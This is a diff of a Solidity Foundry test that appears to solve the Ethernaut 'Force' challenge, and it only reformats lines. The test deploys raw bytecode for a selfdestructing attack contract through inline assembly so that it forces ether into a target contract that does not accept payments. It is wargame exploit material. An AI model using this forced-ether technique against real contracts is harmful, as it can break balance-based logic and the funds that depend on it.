@@ -13,8 +13,7 @@ contract Boom {
 
 contract ASMForce is Test {
     address target;
-    bytes bytecode =
-        hex"608060405260405160503803806050833981016040819052601e916021565b80ff5b600060208284031215603257600080fd5b81516001600160a01b0381168114604857600080fd5b939250505056fe";
+    bytes bytecode = hex"608060405260405160503803806050833981016040819052601e916021565b80ff5b600060208284031215603257600080fd5b81516001600160a01b0381168114604857600080fd5b939250505056fe";
 
     function setUp() public {
         target = address(new Force());
@@ -40,17 +39,11 @@ contract ASMForce is Test {
             // we also add 1 for a partial slot if needed
             // this would be the case if slots (from integer division) * 64 == bytecode_length
             // indicating no remainders
-            if not(eq(mul(0x20, slots), bytecode_length)) {
-                slots := add(slots, 1)
-            }
+            if not(eq(mul(0x20, slots), bytecode_length)) { slots := add(slots, 1) }
 
             // begin the loop, saving the start location of the data in memory
             let startPtr := ptr
-            for {
-                let i := 0
-            } lt(i, slots) {
-                i := add(i, 1)
-            } {
+            for { let i := 0 } lt(i, slots) { i := add(i, 1) } {
                 // grab the data from the adjacent slot
                 let data := sload(add(bytecode_start, i))
                 // save the data
@@ -69,11 +62,7 @@ contract ASMForce is Test {
             // we have now loaded the full init + runtime code to memory
             // we can pass the memory start offset and length to the create opcode
             // which will create a new sub context and return us the address where the init bytecode is deployed
-            let attackContract := create(
-                1,
-                startPtr,
-                add(bytecode_length, 0x20)
-            )
+            let attackContract := create(1, startPtr, add(bytecode_length, 0x20))
         }
 
         assertGt(target.balance, 0);
